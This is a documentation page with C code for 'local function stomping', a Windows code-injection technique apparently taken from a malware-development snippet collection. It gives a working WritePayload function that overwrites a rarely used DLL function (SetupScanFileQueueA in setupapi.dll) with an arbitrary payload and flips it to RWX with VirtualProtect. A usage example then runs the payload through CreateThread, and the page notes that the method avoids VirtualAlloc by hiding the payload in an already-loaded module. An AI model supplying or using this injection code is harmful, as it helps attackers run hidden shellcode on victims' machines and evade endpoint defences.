## Local Function Stomping Injection

Overwrites the bytes of a sacrificial function in memory with a payload and executes it in place. Marks the function's memory region writable with `VirtualProtect`, copies the payload over the function's bytes with `memcpy`, flips the protection to `RWX` with a second `VirtualProtect`, then executes the stomped address via `CreateThread`. Avoids `VirtualAlloc` entirely — the payload lives inside an existing, already-loaded module's memory region. The target function must be rarely used to avoid unintended execution or process crashes; avoid functions exported from `ntdll.dll`, `kernel32.dll`, or `kernelbase.dll`.

**Usage**

Call `WritePayload` with the address of the sacrificial function, the payload buffer, and its size. Obtain the target address either dynamically via `LoadLibraryA` + `GetProcAddress` or statically via `#pragma comment(lib, ...)` and the address-of operator. After a `TRUE` return, pass the same address to `CreateThread` to execute the payload.

- `IN PVOID pAddress`  Address of the sacrificial function to overwrite (e.g. from `GetProcAddress` or `&SetupScanFileQueueA`).
- `IN PBYTE pPayload`  Base address of the payload buffer to stomp into the function.
- `IN SIZE_T sPayloadSize`  Size of `pPayload` in bytes.

**Return Value**

`BOOL`  Returns `TRUE` if the function's memory was successfully overwritten and marked executable, otherwise `FALSE`.

**External Files**

- `windows.h`  `BOOL`, `PVOID`, `PBYTE`, `DWORD`, `SIZE_T`, `HMODULE`, `HANDLE`, `IN`, `VirtualProtect()`, `LoadLibraryA()`, `GetProcAddress()`, `CreateThread()`, `WaitForSingleObject()`, `GetLastError()`

### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>


BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    DWORD dwOldProtection = NULL;

    // Flip the function's memory protection to RW so it can be overwritten.
    if (!VirtualProtect(
        pAddress,       // Base address of the sacrificial function.
        sPayloadSize,   // Size of the region to modify — payload size.
        PAGE_READWRITE, // New protection: writable so memcpy can overwrite the bytes.
        &dwOldProtection
    )) {
        printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Overwrite the function's bytes with the payload.
    memcpy(pAddress, pPayload, sPayloadSize);

    // Flip the protection to RWX so the stomped function can execute.
    if (!VirtualProtect(
        pAddress,               // Base address of the stomped region.
        sPayloadSize,           // Size of the region to modify.
        PAGE_EXECUTE_READWRITE, // New protection: executable so CreateThread can run it.
        &dwOldProtection
    )) {
        printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

**Example**

```c
// --- Dynamic approach: resolve the sacrificial function at runtime ---
HMODULE hModule  = LoadLibraryA("setupapi.dll");
PVOID   pAddress = GetProcAddress(hModule, "SetupScanFileQueueA");

WritePayload(pAddress, pPayload, sPayloadSize);

HANDLE hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINITE);
```
